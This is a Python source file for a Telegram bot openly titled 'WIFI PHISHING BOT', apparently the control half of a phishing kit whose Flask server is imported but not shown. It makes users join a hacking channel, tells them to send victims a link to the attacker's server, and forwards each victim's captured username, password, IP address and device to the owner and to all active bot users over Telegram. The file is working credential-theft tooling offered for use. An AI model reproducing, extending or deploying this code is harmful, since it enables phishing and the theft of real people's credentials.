import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import requests
from server import app

# ===== CONFIG =====
BOT_TOKEN = "YOUR_BOT_TOKEN"
OWNER_ID = 7993444324  # Apni ID daal

bot = telebot.TeleBot(BOT_TOKEN)

# ===== ACTIVE USERS =====
active_users = set()

# ===== CHECK JOIN =====
def check_join(user_id):
    try:
        member = bot.get_chat_member("@nr_hackz", user_id)
        return member.status not in ['left', 'kicked']
    except:
        return False

# ===== JOIN BUTTONS =====
def join_buttons():
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("📢 Join @nr_hackz", url="https://t.me/nr_hackz"),
        InlineKeyboardButton("✅ Verify", callback_data="verify")
    )
    return markup

# ===== /START =====
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id
    active_users.add(user_id)
    
    if check_join(user_id):
        bot.send_message(
            user_id,
            "🔥 *WIFI PHISHING BOT* 🔥\n\n"
            "✅ Bot Active\n"
            "🌐 Server chal raha hai\n\n"
            "Ab victim ko link bhejo:\n"
            f"`http://your-ip:5000`",
            parse_mode="Markdown"
        )
    else:
        bot.send_message(
            user_id,
            "🔐 *Join @nr_hackz first:*",
            reply_markup=join_buttons()
        )

# ===== VERIFY =====
@bot.callback_query_handler(func=lambda call: call.data == "verify")
def verify(call):
    user_id = call.from_user.id
    if check_join(user_id):
        bot.answer_callback_query(call.id, "✅ Verified!")
        bot.send_message(
            user_id,
            "🔥 *WIFI PHISHING BOT* 🔥\n\n"
            "✅ Bot Active\n"
            "🌐 Server chal raha hai\n\n"
            "Ab victim ko link bhejo:\n"
            f"`http://your-ip:5000`",
            parse_mode="Markdown"
        )
    else:
        bot.answer_callback_query(call.id, "❌ Join first!", show_alert=True)

# ===== SEND DATA TO BOT =====
def send_to_bot(data):
    """Server se data bot ko bhejne ke liye"""
    user_id = data.get('user_id')
    username = data.get('username')
    password = data.get('password')
    ip = data.get('ip')
    device = data.get('device')
    
    text = f"📥 *New Victim Data*\n\n"
    text += f"👤 Username: `{username}`\n"
    text += f"🔒 Password: `{password}`\n"
    text += f"🌐 IP: `{ip}`\n"
    text += f"📱 Device: `{device}`\n"
    
    # Send to owner
    bot.send_message(OWNER_ID, text, parse_mode="Markdown")
    
    # Send to all active users
    for uid in active_users:
        if uid != OWNER_ID:
            try:
                bot.send_message(uid, text, parse_mode="Markdown")
            except:
                pass

# ===== RUN BOT =====
def run_bot():
    bot.infinity_polling()

if __name__ == "__main__":
    # Start Flask server in background
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000), daemon=True).start()
    
    # Start bot
    print("🤖 Bot running...")
    run_bot()
